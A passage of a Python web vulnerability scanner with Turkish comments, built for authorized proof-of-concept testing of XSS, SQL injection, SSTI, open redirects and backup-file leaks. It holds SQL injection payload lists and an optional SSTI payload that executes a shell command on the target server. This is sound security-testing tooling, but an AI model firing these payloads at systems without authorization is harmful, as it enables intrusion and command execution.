#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
P@CTH Pentest Scanner — POC-Only, Ethical Use
İzinli ortamlarda kanıt-odaklı DAST taraması (exfiltration yok).
Özellikler:
- Tek parametreli quick tarama (BASE)
- Login sonrası tarama (Playwright → cookie aktarımı) [scan]
- Crawler (include/exclude regex + rate limit)
- Header/CSP kontrolleri, redirect zinciri
- XSS (Reflected + DOM) — token yansıması POC (+ sink ipucu)
- SSTI POC (strict/çift doğrulama) + opsiyonel sınırlı RCE kanıtı (lcoal)
- SQLi POC: hata/boolean (+opsiyonel time-based, lcoal)
- Open Redirect POC
- JNLP analizörü (all-permissions / jar ipuçları)
- Bilinmeyen zafiyet avı (anomali/5xx/delay/stack trace)
- Form/CSRF yakalama, basit form denemeleri
- Directory Listing & Webmail fingerprint
- Backup/Source leak avcısı (.swp/.bak/~ …) — POC için 2KB range
- JSON & Markdown rapor (report.json, report.md)
- Konsol “Özet Rehber”: bulgu → kısa açıklama + güvenli POC ipucu + param

KULLANIM: Yalnızca YAZILI İZİN alınmış hedeflerde!
"""

from __future__ import annotations

import json
import time
import random
import re as _re
from typing import Optional, Literal, List, Tuple, Dict, Any, Set
from urllib.parse import urljoin, urlparse, urlencode, quote, urlunparse
from collections import deque

import requests
from bs4 import BeautifulSoup
from playwright.sync_api import sync_playwright
import typer


# -------------------- Global Config --------------------

app = typer.Typer(add_completion=False, no_args_is_help=True)
session = requests.Session()
session.headers.update({"User-Agent": "P@CTHPentest/1.6 (POC-Only)"})


SENSITIVE_MARKERS: Tuple[str, ...] = ("KEY", "TOKEN", "SECRET", "PASS", "PWD", "AUTH")
XSS_TOK: str = "XSS_POC_" + str(random.randint(100000, 999999))
MAX_POC_LEN: int = 500

ERROR_KEYWORDS: List[str] = [
    "exception", "stack trace", "traceback", "sql syntax", "warning:", "fatal:",
    "notice:", "undefined index", "undefined variable", "nullpointer",
    "referenceerror", "typeerror",
]

COMMON_PARAM_NAMES: List[str] = [
    "q", "s", "search", "query", "keyword", "id", "page", "ref",
    "return", "next", "redirect", "u", "url", "back",
]

ANOMALY_PAYLOADS: List[Tuple[str, str]] = [
    ("tick", "___P@CTH_TICK___"),
    ("op_like", "{{7*7}}"),
    ("quote_bomb", "'\"`)])}"),
    ("format_str", "%s%s%s%s%s"),
    ("tmpl_str", "${7*7}"),
]

# ---- SQLi signatures & payloads ----
SQL_ERROR_PATTERNS: List[str] = [
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch", "mysqli",
    "unclosed quotation mark after the character string", "incorrect syntax near",
    "sql server", "syntax error at or near", "pg_query", "sqlstate[", "pdoexception",
    "ora-00933", "ora-00936", "ora-01756", "sqlite error", 'near "syntax"',
]

SQL_BOOL_PAYLOADS: List[Tuple[str, ...]] = [
    ("'",), ('")',), (")",), ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'), ("1 AND 1=1", "1 AND 1=2"),
]

SQL_TIME_PAYLOADS: List[str] = [
    "' AND SLEEP(3)-- -", '" AND SLEEP(3)-- -',
    "1; SELECT pg_sleep(3)--", "'; WAITFOR DELAY '0:0:3'--",
]

# ---- Parking / Directory / Webmail / DOM sinks ----
PARKING_SIGNATURES = ["sedoparking", "namebright", "parkingcrew", "afternic", "bodis", "undeveloped"]
DIR_INDEX_MARKERS = ["Index of /", "<title>Index of /", "mod_autoindex"]
WEBMAIL_SIGNATURES = {
    "squirrelmail": ["functions/", "plugins/", "themes/", "src/", "po/", "locale/", "config/"],
    "roundcube": ["program/", "skins/", "bin/", "plugins/", "config/"],
    "horde": ["imp/", "turba/", "ingo/", "kronolith/"],
}
DOM_SINKS = ["innerHTML", "document.write", "outerHTML", "eval(", "new Function(", "insertAdjacentHTML"]

# ---- Backup / Source leak ----
BACKUP_SUFFIXES = ["~", ".bak", ".old", ".orig", ".save", ".tmp", ".backup", ".1", ".swp", ".swo", ".swpx"]
SOURCE_EXTS = [".php", ".phtml", ".jsp", ".aspx", ".cfm", ".js", ".config", ".ini"]
VIM_SWP_MAGIC = b"b0VIM"


# -------------------- Utilities --------------------

def polite_sleep(ms: int = 250) -> None:
    time.sleep(ms / 1000.0)


def mask_sensitive(text: str) -> str:
    lines = (text or "").splitlines()[:60]
    out: List[str] = []
    for ln in lines:
        if any(m.lower() in ln.lower() for m in SENSITIVE_MARKERS):
            out.append("[MASKED SENSITIVE LINE]")
        else:
            out.append(ln[:180])
    return "\n".join(out)[:MAX_POC_LEN]


def safe_contains(haystack: str, needles: List[str] | Tuple[str, ...]) -> bool:
    hay = (haystack or "").lower()
    return any(n.lower() in hay for n in needles)


def same_origin(a: str, b: str) -> bool:
    pa, pb = urlparse(a), urlparse(b)
    return (pa.scheme, pa.netloc) == (pb.scheme, pb.netloc)


def fetch(url: str, timeout: int = 10, allow_redirects: bool = True):
    try:
        return session.get(url, timeout=timeout, allow_redirects=allow_redirects)
    except requests.RequestException:
        return None


def post(url: str, data: Optional[Dict[str, Any]] = None, timeout: int = 10, allow_redirects: bool = True):
    try:
        return session.post(url, data=data or {}, timeout=timeout, allow_redirects=allow_redirects)
    except requests.RequestException:
        return None


def head2k(url: str, timeout: int = 8):
    try:
        return session.get(url, timeout=timeout, headers={"Range": "bytes=0-2047"}, allow_redirects=False)
    except requests.RequestException:
        return None


def is_parked(html: str) -> bool:
    low = (html or "").lower()
    return any(s in low for s in PARKING_SIGNATURES)


# -------------------- Evidence Collector --------------------

class Evidence:
    def __init__(self) -> None:
        self.items: List[Dict[str, Any]] = []
        self._seen: Set[Tuple] = set()

    def _key(self, kind: str, url: str, extra: Dict[str, Any]) -> Tuple:
        important = tuple(sorted((k, str(extra.get(k))) for k in ("param", "variant", "final", "status", "payload", "proof")))
        return kind, url, important

    def add(self, kind: str, url: str, extra: Optional[Dict[str, Any]] = None) -> None:
        extra = extra or {}
        key = self._key(kind, url, extra)
        if key in self._seen:
            return
        self._seen.add(key)
        self.items.append({"type": kind, "url": url, "extra": extra, "ts": int(time.time())})

    def dump_json(self, path: str = "report.json") -> str:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.items, f, ensure_ascii=False, indent=2)
        return path

    @staticmethod
    def _severity(it: Dict[str, Any]) -> Tuple[int, str]:
        t = it["type"]
        url = it["url"]
        ext = it.get("extra", {})
        critical, high, med, low = 4, 3, 2, 1
        s = low

        if t in ("ssti_rce_poc", "source_leak_backup", "source_leak_vim_swap"):
            s = critical
        elif t in ("ssti_poc", "dom_xss_reflection", "xss_reflected", "xss_form_reflection", "dir_listing_open", "webmail_signature"):
            s = high
        elif t in ("csp_missing", "headers_missing", "cors_insecure", "csp_weak", "anomaly_http_5xx",
                   "anomaly_error_keywords", "anomaly_length", "anomaly_slow", "open_redirect",
                   "jnlp_all_permissions", "server_outdated_hint", "no_tls"):
            s = med
        elif t in ("redirect_chain", "crawl", "server_banner", "parked_page"):
            s = low

        if (any(k in url for k in ("/login", "/prelogin"))
            or ext.get("param") in ("j_username", "j_password", "username", "password")):
            s = max(s, high)

        label = {critical: "CRITICAL", high: "HIGH", med: "MEDIUM", low: "LOW"}[s]
        return s, label

    def dump_markdown(self, path: str = "report.md") -> str:
        ranked = [(self._severity(it), it) for it in self.items]
        ranked.sort(key=lambda x: (-x[0][0], x[1]["type"], x[1]["url"]))

        lines: List[str] = []
        lines.append("# Pentest Tarama Özeti (POC-Only)\n")

        bucket: Dict[str, int] = {}
        for _, it in ranked:
            sev = self._severity(it)[1]
            bucket[sev] = bucket.get(sev, 0) + 1

        lines.append("## Özet (Bulgu Sayıları)\n")
        for k in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
            if k in bucket:
                lines.append(f"- **{k}**: {bucket[k]}")
        lines.append("\n## Bulgular\n")

        for (sev_tuple, it) in ranked:
            _, sev_label = sev_tuple
            t = it["type"]
            u = it["url"]
            ex = it.get("extra", {})
            ex_json = json.dumps(ex, ensure_ascii=False)[:300]
            param = ex.get("param")
            param_line = f"\n- Parametre: `{param}`" if param else ""
            lines.append(f"### [{sev_label}] {t}\n- URL: `{u}`{param_line}\n- Detay: `{ex_json}`\n")

        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        return path

    # ------------ Console Summary with Guidance ----++-----

    def _guidance(self, it: Dict[str, Any]) -> Tuple[str, str]:
        t = it["type"]
        ex = it.get("extra", {})
        p = ex.get("param", None)

        if t == "xss_reflected":
            return ("Reflected XSS şüphesi (token yansıdı).",
                    f"Param `{p}` için benzersiz token verildi; HTML bağlamını kontrol et. Zararsız POC: <b>XSS</b> gibi HTML ile yalnız yansıma bak. CSP yoksa risk artar.")
        if t == "xss_form_reflection":
            fields = ex.get("fields")
            fstr = f"Alandaki yansıma: {fields}" if fields else "Form alanı yansıması."
            return ("Form tabanlı XSS şüphesi.", f"{fstr}. Zararsız POC: form alanına token yaz, sayfada işlenmiş mi bak.")
        if t == "dom_xss_reflection":
            proof = ex.get("proof", "token_in_dom")
            if proof == "token_in_dom_with_sink":
                return ("DOM XSS olası (sink ipucu var).", "Kodda innerHTML/document.write/eval vb. sink kullanımı görünüyor; bağlamı doğrula.")
            return ("DOM yansıma (sink izi yok).", "Token DOM’a girmiş; ama sink yoksa XSS olmayabilir. JS kaynaklarını analiz et.")
        if t == "ssti_poc":
            pv = ex.get("variant", "tpl")
            return ("SSTI POC (şablon motoru etkileniyor).",
                    f"POC `{pv}` ile doğrulandı. Zararsız POC: {{7*7}} aritmetik. Exploit etmeyin; kanıt üretmekle sınırlı.")
        if t == "ssti_rce_poc":
            return ("SSTI → Komut çalıştırma kanıtı (LAB).", "LAB'da sınırlı komut (uname -s) döndü. Canlıda devre dışı.")
        if t in ("sqli_error", "sqli_error_form"):
            return ("SQLi (hata tabanlı) işaretleri.", f"`{p}` paramında kapatma karakteri hata/500 üretti. Zararsız POC: tek tırnak.")
        if t in ("sqli_boolean", "sqli_boolean_form"):
            return ("SQLi (boolean differ) olası.", f"`{p}` paramında AND '1'='1 vs '1'='2 ile içerik farkı oluştu.")
        if t in ("sqli_time", "sqli_time_form"):
            return ("SQLi (time-based) olası (LAB).", f"`{p}` paramına SLEEP/pg_sleep ile gecikme gözlendi.")
        if t == "open_redirect":
            return ("Açık yönlendirme olası.", f"`{p}` paramı dış domain'e 30x yönlendiriyor. Whitelist/allowlist uygulayın.")
        if t == "jnlp_all_permissions":
            return ("JNLP all-permissions.", "İstemci tarafında tam izinli JNLP çalıştırma riski. Yüzeyi kapatın veya imzalı jar zorunlu.")
        if t == "jnlp_jar_hint":
            return ("JNLP jar izi.", "Eski Java Web Start yüzeyi risklidir; devre dışı bırakın.")
        if t in ("csp_missing", "headers_missing", "csp_weak", "cors_insecure"):
            return ("Güvenlik başlığı zayıflığı.", "CSP/HSTS/XFO eksikleri XSS/Clickjacking riskini artırır.")
        if t.startswith("anomaly_"):
            return ("Anomali/stack trace/500 sinyali.", "Hata mesajı veya yanıt farkı gözlendi. Manuel doğrulama önerilir.")
        if t == "redirect_chain":
            return ("Uzun yönlendirme zinciri.", "Gereksiz 302 zincirlerini azaltın.")
        if t == "dir_listing_open":
            return ("Dizin listeleme açık (Apache autoindex).",
                    "GET ile 'Index of /' dönüyor; alt klasörler gezilebiliyor. Mitigasyon: 'Options -Indexes' veya vhost/.htaccess ile kapatın.")
        if t == "webmail_signature":
            return ("Webmail dosya yapısı ifşası.",
                    "Aday: " + ", ".join(ex.get("candidates", [])) + ". Doğrulama: sadece dosya isimlerini raporlayın; okuma yok.")
        if t == "server_banner":
            return ("Sunucu banner’ı görünür.", "ServerTokens Prod + ServerSignature Off önerilir.")
        if t == "server_outdated_hint":
            return ("Sunucu sürümü çok eski görünüyor.", "Sürüm yükseltme/izolasyon önerilir.")
        if t == "no_tls":
            return ("HTTP (TLS yok) kullanımı.", "HTTPS’e zorunlu yönlendirme (HSTS), HTTP portunu kapatın.")
        if t == "source_leak_vim_swap":
            return ("Vim swap dosyası sızmış (kaynak kod).", "İlk baytlar 'b0VIM'. Backup/swap erişimini 404’a çekin; dosyaları kaldırın.")
        if t == "source_leak_backup":
            return ("Yedek/backup dosya ifşası (kaynak kod görülebiliyor).",
                    "URL sonuna .bak/.old/~ eklenince kod görünüyor. Backup dosyalarını kaldırın veya erişimi engelleyin.")
        if t == "parked_page":
            return ("Parked/parking sayfası tespit edildi.", "Bu alan gerçek uygulama değil; bulgular operasyonel olmayabilir.")
        if t == "crawl":
            return ("Crawl özeti.", "Daha fazla yüzey için loginli tarama/filtre kullanılabilir.")
        return ("Genel bulgu.", "Detaylar report.md içinde.")

    def print_console_summary(self) -> None:
        if not self.items:
            return
        typer.secho("\n=== ÖZET REHBER (POC-Only) ===", fg=typer.colors.CYAN, bold=True)
        ranked = [(self._severity(it), it) for it in self.items]
        ranked.sort(key=lambda x: (-x[0][0], x[1]["type"], x[1]["url"]))

        printed: Set[Tuple[str, str, Optional[str]]] = set()
        for (sev_tuple, it) in ranked:
            _, sev_label = sev_tuple
            t = it["type"]
            u = it["url"]
            ex = it.get("extra", {})
            p = ex.get("param")
            key = (t, u, p)
            if key in printed:
                continue
            printed.add(key)

            desc, poc = self._guidance(it)
            base = f"[{sev_label}] {t}"
            if p:
                base += f" | param: {p}"
            typer.secho(f"- {base}", fg=typer.colors.WHITE, bold=True)
            typer.secho(f"  • URL: {u}", fg=typer.colors.WHITE)
            typer.secho(f"  • Özet: {desc}", fg=typer.colors.YELLOW)
            typer.secho(f"  • POC ipucu: {poc}", fg=typer.colors.GREEN)


evidence = Evidence()


# -------------------- Discovery / Crawl ------------------------

def crawl(seed: str, max_pages: int = 60, include_re: Optional[str] = None,
          exclude_re: Optional[str] = None, rate_ms: int = 250) -> List[str]:
    seen: Set[str] = {seed}
    q: deque[str] = deque([seed])
    urls: List[str] = [seed]
    inc = _re.compile(include_re) if include_re else None
    exc = _re.compile(exclude_re) if exclude_re else None

    while q and len(urls) < max_pages:
        u = q.popleft()
        r = fetch(u)
        polite_sleep(rate_ms)
        if not r:
            continue
        ctype = (r.headers.get("Content-Type") or "").lower()
        if "text/html" not in ctype:
            continue
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            v = urljoin(u, a["href"])
            if v in seen:
                continue
            if not same_origin(seed, v):
                continue
            if inc and not inc.search(v):
                continue
            if exc and exc.search(v):
                continue
            seen.add(v)
            q.append(v)
            urls.append(v)
            if len(urls) >= max_pages:
                break
    return urls


def follow_redirects(url: str) -> None:
    r = fetch(url)
    if not r:
        return
    chain = [(resp.status_code, resp.headers.get("Location", "")) for resp in r.history] + [(r.status_code, "")]
    if r.history:
        evidence.add("redirect_chain", url, {"chain": chain, "final": r.url})


# -------------------- Headers / CSP --------------------

def header_checks(url: str) -> None:
    r = fetch(url)
    if not r:
        return
    missing = [h for h in ("Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options") if h not in r.headers]
    if missing:
        evidence.add("headers_missing", url, {"missing": missing})
    if r.headers.get("Access-Control-Allow-Origin") == "*":
        evidence.add("cors_insecure", url, {"acao": "*"})


def csp_note(url: str) -> None:
    r = fetch(url)
    if not r:
        return
    csp = r.headers.get("Content-Security-Policy")
    if not csp:
        evidence.add("csp_missing", url, {})
    else:
        if "unsafe-inline" in csp or "unsafe-eval" in csp:
            evidence.add("csp_weak", url, {"policy": csp[:240]})


# -------------------- Forms / CSRF --------------------

def extract_csrf(soup: BeautifulSoup) -> Optional[str]:
    cand = soup.select_one(
        "input[name=csrf], input[name=_token], "
        "input[name=__RequestVerificationToken], input[name=csrfmiddlewaretoken]"
    )
    return cand.get("value") if cand else None


def discover_forms(html: str):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")


def submit_form(base: str, form, payload_value: str = "probe"):
    action = form.get("action") or ""
    target = urljoin(base, action)
    method = form.get("method", "get").lower()
    inputs: Dict[str, str] = {}
    field_names: List[str] = []
    for i in form.find_all("input"):
        name = i.get("name")
        if not name:
            continue
        val = i.get("value") or payload_value
        inputs[name] = val
        field_names.append(name)
    csrf = extract_csrf(BeautifulSoup(str(form), "html.parser"))
    if csrf and "csrf" not in inputs:
        inputs["csrf"] = csrf
    if method == "post":
        return post(target, data=inputs), field_names
    return fetch(target + ("?" + urlencode(inputs) if inputs else "")), field_names


def forms_probe(url: str, rate_ms: int = 250) -> None:
    r = fetch(url)
    polite_sleep(rate_ms)
    if not r:
        return
    forms = discover_forms(r.text)
    for f in forms:
        rr, fields = submit_form(url, f, payload_value=XSS_TOK)
        polite_sleep(rate_ms)
        if rr and XSS_TOK in rr.text:
            evidence.add("xss_form_reflection", rr.url, {"proof": "form_reflection", "fields": fields})


# -------------------- XSS (Reflected + DOM) --------------------

def discover_query_params(url: str, html: str) -> List[str]:
    found: Set[str] = set()
    pr = urlparse(url)
    if pr.query:
        for kv in pr.query.split("&"):
            k = kv.split("=")[0]
            if k:
                found.add(k)
    soup = BeautifulSoup(html, "html.parser")
    for inp in soup.find_all("input"):
        name = inp.get("name")
        if name:
            found.add(name)
    for k in COMMON_PARAM_NAMES:
        found.add(k)
    return list(found)[:12]


def xss_reflected_sweep(url: str, rate_ms: int = 250, max_params: int = 8) -> None:
    r = fetch(url)
    polite_sleep(rate_ms)
    if not r:
        return
    ctype = (r.headers.get("Content-Type") or "").lower()
    if "text/html" not in ctype:
        return
    params = discover_query_params(url, r.text)[:max_params]
    for name in params:
        test_url = url + (("&" if "?" in url else "?") + urlencode({name: XSS_TOK}))
        rr = fetch(test_url)
        polite_sleep(rate_ms)
        if rr and XSS_TOK in rr.text:
            evidence.add("xss_reflected", test_url, {"param": name, "proof": "token_reflected"})


def dom_xss_playwright_deep(base: str, param: str = "q") -> None:
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            u = base + (("&" if "?" in base else "?") + urlencode({param: XSS_TOK}))
            page.goto(u, wait_until="load")
            html = page.content()
            if XSS_TOK in html:
                if any(s in html for s in DOM_SINKS):
                    evidence.add("dom_xss_reflection", u, {"param": param, "proof": "token_in_dom_with_sink"})
                else:
                    evidence.add("dom_xss_reflection", u, {"param": param, "proof": "token_in_dom"})
            browser.close()
    except Exception as e:
        evidence.add("playwright_error", base, {"error": str(e)})


# ---------------- SSTI (strict POC + Optional Guarded RCE) --------------

def ssti_poc(url: str, rate_ms: int = 250) -> None:
    r_home = fetch(url)
    polite_sleep(rate_ms)
    if r_home and is_parked(r_home.text):
        evidence.add("parked_page", url, {"engine": "parking-signature"})
        return

    # strict dual-match: AA{{7*7}}ZZ & BB{{1337*1337}}CC
    probes = [("AA{{7*7}}ZZ", "AA49ZZ"), ("BB{{1337*1337}}CC", "BB1787569CC")]
    ok = 0
    last_resp = None
    for payload, expect in probes:
        test = url + (("&" if "?" in url else "?") + "input=" + quote(payload))
        r = fetch(test)
        polite_sleep(rate_ms)
        if r and expect in (r.text or ""):
            ok += 1
            last_resp = r
    if ok == len(probes) and last_resp is not None:
        evidence.add("ssti_poc", last_resp.url, {"variant": "strict_dual", "snippet": mask_sensitive(last_resp.text), "param": "input"})


def ssti_rce_guarded(url: str, rate_ms: int = 250) -> None:
    payload = "{{ cycler.__init__.__globals__.os.popen('uname -s').read() }}"
    test = url + (("&" if "?" in url else "?") + "input=" + quote(payload))
    r = fetch(test)
    polite_sleep(rate_ms)
    if r and safe_contains(r.text, ["linux", "darwin", "windows", "bsd"]):
        evidence.add("ssti_rce_poc", test, {"snippet": mask_sensitive(r.text), "param": "input"})


# --------------- Unknown / Anomaly Probes ----------------

def unknown_probe(url: str, rate_ms: int = 250, max_params: int = 6) -> None:
    r = fetch(url)
    polite_sleep(rate_ms)
    if not r:
        return
    ctype = (r.headers.get("Content-Type") or "").lower()
    if "text/html" not in ctype:
        return
    base_len = len(r.text)
    params = discover_query_params(url, r.text)[:max_params]

    for (pname, pval) in ANOMALY_PAYLOADS:
        for k in params:
            test_url = url + (("&" if "?" in url else "?") + urlencode({k: pval}))
            start = time.time()
            rr = fetch(test_url)
            polite_sleep(rate_ms)
            if not rr:
                continue
            dt = time.time() - start

            if rr.status_code >= 500:
                evidence.add("anomaly_http_5xx", test_url, {"param": k, "payload": pname, "status": rr.status_code})
            if abs(len(rr.text) - base_len) > 2000:
                evidence.add("anomaly_length", test_url, {"param": k, "payload": pname, "delta": len(rr.text) - base_len})
            low = (rr.text or "").lower()
            if any(kw in low for kw in ERROR_KEYWORDS):
                evidence.add("anomaly_error_keywords", test_url, {"param": k, "payload": pname})
            if dt > 4.0:
                evidence.add("anomaly_slow", test_url, {"param": k, "payload": pname, "rt": round(dt, 3)})


# -------------------- Open Redirect & JNLP ----------------

OPEN_REDIRECT_PARAMS: List[str] = ["next", "return", "redirect", "url", "u", "back", "continue", "dest"]


def open_redirect_probe(url: str, rate_ms: int = 250) -> None:
    r = fetch(url)
    polite_sleep(rate_ms)
    if not r:
        return
    ctype = (r.headers.get("Content-Type") or "").lower()
    if "text/html" not in ctype:
        return

    evil = "https://example.org/"
    for p in OPEN_REDIRECT_PARAMS:
        test = url + (("&" if "?" in url else "?") + urlencode({p: evil}))
        resp = fetch(test, allow_redirects=False)
        polite_sleep(rate_ms)
        if not resp:
            continue
        loc = resp.headers.get("Location", "")
        if (resp.status_code in (301, 302, 303, 307, 308)
                and loc.startswith(("http://", "https://"))
                and urlparse(loc).netloc not in (urlparse(url).netloc,)):
            evidence.add("open_redirect", test, {"param": p, "location": loc, "status": resp.status_code})


def analyze_jnlp(url: str, rate_ms: int = 250) -> None:
    r = fetch(url, allow_redirects=True)
    polite_sleep(rate_ms)
    if not r:
        return
    ct = (r.headers.get("Content-Type") or "").lower()
    if ".jnlp" not in url and "xml" not in ct and "application/x-java-jnlp-file" not in ct:
        return
    text = r.text or ""
    lower = text.lower()
    if "<jnlp" in lower:
        if "<all-permissions" in lower:
            evidence.add("jnlp_all_permissions", url, {})
        if "<jar " in lower:
            start = lower.find("<jar ")
            snippet = text[start: start + 200] if start != -1 else text[:200]
            evidence.add("jnlp_jar_hint", url, {"snippet": snippet})


# -------------------- Auth (Playwright -> Requests Cookies) --------------------

def login_with_playwright_and_copy_cookies(
    login_url: str,
    username: str,
    password: str,
    user_field: str = 'input[name="username"]',
    pass_field: str = 'input[name="password"]',
    submit_selector: str = 'button[type="submit"], input[type="submit"]',
    wait_after_submit: Optional[Literal["domcontentloaded", "load", "networkidle"]] = "networkidle",
    headless: bool = True,
) -> None:
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=headless)
        page = browser.new_page()
        page.goto(login_url, wait_until="domcontentloaded")
        page.fill(user_field, username)
        page.fill(pass_field, password)
        page.click(submit_selector)
        if wait_after_submit:
            page.wait_for_load_state(wait_after_submit)
        for c in page.context.cookies():
            session.cookies.set(c["name"], c["value"], domain=c.get("domain"), path=c.get("path", "/"))
        browser.close()


# -------------------- SQLi Probes --------------------

def sqli_probe(url: str, rate_ms: int = 250, max_params: int = 8, enable_time: bool = False, timeout: int = 12) -> None:
    r0 = fetch(url, timeout=timeout)
    polite_sleep(rate_ms)
    if not r0:
        return
    ctype = (r0.headers.get("Content-Type") or "").lower()
    if "text/html" not in ctype and "application/json" not in ctype:
        return

    base_html = r0.text or ""
    params = discover_query_params(url, base_html)[:max_params]

    for name in params:
        for tup in SQL_BOOL_PAYLOADS:
            inj = tup[0]
            test_url = url + (("&" if "?" in url else "?") + urlencode({name: inj}))
            r = fetch(test_url, timeout=timeout)
            polite_sleep(rate_ms)
            if not r:
                continue
            low = (r.text or "").lower()
            if any(sig in low for sig in SQL_ERROR_PATTERNS) or r.status_code >= 500:
                evidence.add("sqli_error", test_url, {"param": name, "payload": inj[:40]})
                break

        if len(SQL_BOOL_PAYLOADS) >= 2 and len(SQL_BOOL_PAYLOADS[1]) == 2:
            t_true, t_false = SQL_BOOL_PAYLOADS[1]
            tu = url + (("&" if "?" in url else "?") + urlencode({name: t_true}))
            fu = url + (("&" if "?" in url else "?") + urlencode({name: t_false}))
            rt = fetch(tu, timeout=timeout)
            polite_sleep(rate_ms)
            rf = fetch(fu, timeout=timeout)
            polite_sleep(rate_ms)
            if rt and rf:
                diff = abs(len((rt.text or "")) - len((rf.text or "")))
                if diff > 100 and rt.status_code == rf.status_code:
                    evidence.add("sqli_boolean", url, {"param": name, "diff": diff})

    if enable_time:
        for name in params:
            for inj in SQL_TIME_PAYLOADS:
                test_url = url + (("&" if "?" in url else "?") + urlencode({name: inj}))
                t0 = time.time()
                r = fetch(test_url, timeout=timeout + 3)
                dt = time.time() - t0
                polite_sleep(rate_ms)
                if r and dt > 2.8:
                    evidence.add("sqli_time", test_url, {"param": name, "rt": round(dt, 3)})
                    break


def sqli_probe_forms(url: str, rate_ms: int = 250, enable_time: bool = False, timeout: int = 12) -> None:
    r = fetch(url, timeout=timeout)
    polite_sleep(rate_ms)
    if not r:
        return
    soup = BeautifulSoup(r.text, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        action = form.get("action") or ""
        target = urljoin(url, action)
        method = form.get("method", "get").lower()
        inputs: Dict[str, str] = {}
        for i in form.find_all("input"):
            n = i.get("name")
            if n:
                inputs[n] = i.get("value") or "test"
        csrf = extract_csrf(BeautifulSoup(str(form), "html.parser"))
        if csrf and "csrf" not in inputs:
            inputs["csrf"] = csrf

        if inputs:
            k = next(iter([x for x in inputs.keys() if x.lower() not in ("csrf", "password")]), None)
            if k:
                orig = inputs[k]
                inputs[k] = "'"
                rr = post(target, data=inputs, timeout=timeout) if method == "post" else fetch(target + "?" + urlencode(inputs), timeout=timeout)
                polite_sleep(rate_ms)
                if rr:
                    low = (rr.text or "").lower()
                    if any(sig in low for sig in SQL_ERROR_PATTERNS) or rr.status_code >= 500:
                        evidence.add("sqli_error_form", target, {"param": k})
                inputs[k] = orig

        if inputs:
            k = next(iter([x for x in inputs.keys() if x.lower() != "csrf"]), None)
            if k:
                orig = inputs[k]
                inputs[k] = "' AND '1'='1"
                r1 = post(target, data=inputs, timeout=timeout) if method == "post" else fetch(target + "?" + urlencode(inputs), timeout=timeout)
                inputs[k] = "' AND '1'='2"
                r2 = post(target, data=inputs, timeout=timeout) if method == "post" else fetch(target + "?" + urlencode(inputs), timeout=timeout)
                polite_sleep(rate_ms)
                if r1 and r2 and abs(len((r1.text or "")) - len((r2.text or ""))) > 100:
                    evidence.add("sqli_boolean_form", target, {"param": k})
                inputs[k] = orig

        if enable_time and inputs:
            k = next(iter([x for x in inputs.keys() if x.lower() != "csrf"]), None)
            if k:
                orig = inputs[k]
                inputs[k] = SQL_TIME_PAYLOADS[0]
                t0 = time.time()
                rtime = post(target, data=inputs, timeout=timeout + 3) if method == "post" else fetch(target + "?" + urlencode(inputs), timeout=timeout + 3)
                dt = time.time() - t0
                polite_sleep(rate_ms)
                if rtime and dt > 2.8:
                    evidence.add("sqli_time_form", target, {"param": k, "rt": round(dt, 3)})
                inputs[k] = orig


# -------------------- Directory Listing / Banner / Backup Leak --------------------

def directory_listing_probe(url: str, rate_ms: int = 250) -> None:
    r = fetch(url)
    polite_sleep(rate_ms)
    if not r:
        return
    ct = (r.headers.get("Content-Type") or "").lower()
    if "text/html" not in ct:
        return
    html = r.text or ""
    low = html.lower()

    if any(m.lower() in low for m in DIR_INDEX_MARKERS) and ("<pre>" in low or "Index of /" in html):
        soup = BeautifulSoup(html, "html.parser")
        names = []
        for a in soup.find_all("a", href=True):
            name = a.get_text(strip=True)
            if name and name not in ("Parent Directory", "/") and (name.endswith("/") or name.endswith(".php")):
                names.append(name)
        evidence.add("dir_listing_open", url, {"entries": names[:30]})
        hit = []
        for app, needles in WEBMAIL_SIGNATURES.items():
            if any(n in names for n in needles):
                hit.append(app)
        if hit:
            evidence.add("webmail_signature", url, {"candidates": hit, "entries": names[:15]})

    m = _re.search(r"Apache/([0-9.]+)", html, _re.I)
    if m:
        ver = m.group(1)
        evidence.add("server_banner", url, {"server": f"Apache/{ver}"})
        try:
            major = int(ver.split(".")[0])
            minor = int(ver.split(".")[1])
            if (major, minor) <= (2, 2):
                evidence.add("server_outdated_hint", url, {"server": f"Apache/{ver}"})
        except Exception:
            pass

    if urlparse(url).scheme == "http":
        evidence.add("no_tls", url, {})


def _gen_backup_candidates(u: str) -> List[str]:
    pr = urlparse(u)
    if not pr.path or pr.path.endswith("/"):
        return []
    cands = []
    for suf in BACKUP_SUFFIXES:
        cands.append(urlunparse(pr._replace(path=pr.path + suf)))
    return cands


def looks_like_code(text: str) -> bool:
    low = text.lower()
    return ("<?php" in low or "include(" in low or "class " in low or "function " in low or "var " in low)


def backup_leak_probe(url: str, rate_ms: int = 250) -> None:
    pr = urlparse(url)
    if not any(pr.path.lower().endswith(ext) for ext in SOURCE_EXTS):
        return
    for cand in _gen_backup_candidates(url):
        r = head2k(cand)
        polite_sleep(rate_ms)
        if not r or r.status_code >= 400:
            continue
        ct = (r.headers.get("Content-Type") or "").lower()
        body = r.content or b""
        if body.startswith(VIM_SWP_MAGIC) or (ct.startswith("application/octet-stream") and body[:4] == b"b0VI"):
            evidence.add("source_leak_vim_swap", cand, {"bytes": len(body)})
            continue
        try:
            txt = body.decode(errors="ignore")
        except Exception:
            txt = ""
        if looks_like_code(txt):
            snippet = mask_sensitive(txt)[:200]
            evidence.add("source_leak_backup", cand, {"snippet": snippet})


# -------------------- SHARED RUNNER --------------------

def run_scan(
    base: str,
    login_url: str = "",
    auth_user: str = "",
    auth_pass: str = "",
    include_pattern: str = "",
    exclude_pattern: str = "",
    enable_ssti_rce: bool = False,
    enable_xss_deep: bool = True,
    enable_unknown_probe: bool = True,
    enable_sql: bool = True,
    enable_sql_time: bool = False,
    max_pages: int = 60,
    max_params_per_page: int = 8,
    rate_ms: int = 300,
) -> str:
    header_checks(base)
    follow_redirects(base)
    csp_note(base)

